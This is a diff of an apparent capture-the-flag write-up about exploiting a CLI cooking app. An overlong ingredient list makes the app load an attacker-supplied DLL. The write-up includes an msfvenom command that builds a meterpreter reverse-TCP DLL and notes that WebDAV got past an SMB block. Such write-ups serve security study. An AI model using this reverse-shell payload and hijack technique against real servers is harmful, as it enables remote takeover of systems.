@@ -10,7 +10,7 @@ Then, we have a beautiful cli's app that ask us for ingredients so they can cook
 The simple trick here is to type list a ingredients so long that they will be an error. The important line in the error is that he has tried to load a DLL library but it was unable to load it, simply because it doesn'it exists ! It has tried to load a DLL with the end of the string that you had typed, so from here we can execute a DLL library of our choice, even our own !   
 So we need to have a DLL that can do a reverse shell so we can have access to the server that is running the app. For that I have used msfvenom (.DLL in uppercase) : 
 ```
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=myIPAdress LPORT=4444 -f dll -o msf.DLL
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip_address LPORT=4444 -f dll -o msf.DLL
 ```
 And then we need a share that the server can use, the first thing that I had tried is smb share, but unfortunately, it has been blocked via a regex, so we need another technology, the next this I tried was webdav and it worked !
 You need to host a webdav server, for that I have used wsgidav, it is a generic and extendable WebDAV server written in Python and based on WSGI. I have used this command, you need to launch it where you have generated your DLL library.
